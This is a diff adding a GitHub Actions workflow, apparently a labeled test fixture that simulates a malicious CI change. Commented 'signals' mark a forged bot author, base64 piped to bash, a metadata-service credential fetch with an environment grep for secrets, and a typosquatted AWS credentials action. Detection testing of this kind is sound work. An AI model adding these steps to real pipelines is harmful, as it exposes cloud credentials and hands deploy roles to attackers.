@@ -1,0 +1,40 @@
+name: CI Pipeline Update
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  build-and-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # Signal 1 — forged_bot_author
+      - name: Configure Git
+        run: |
+          git config user.name "build-bot"
+          git config user.email "build-bot@ci.internal"
+
+      # Signal 2 — base64_payload
+      - name: Run Build Checks
+        run: |
+          echo "SGVsbG8gZnJvbSBNZWdhbG9kb24gU2ltdWxhdGlvbiBUZXN0UGF5bG9hZA==" | base64 -d | bash
+
+      # Signal 3 — credential_harvest (two sub-patterns)
+      - name: Health Check
+        run: |
+          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+          env | grep -i "KEY\|TOKEN\|SECRET\|PASSWORD"
+
+      # Signal 4 — oidc_elevation_typosquatted
+      - name: Assume Deploy Role
+        uses: aws-actions-unofficial/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::999999999999:role/MegalodonRole
+          aws-region: us-east-1
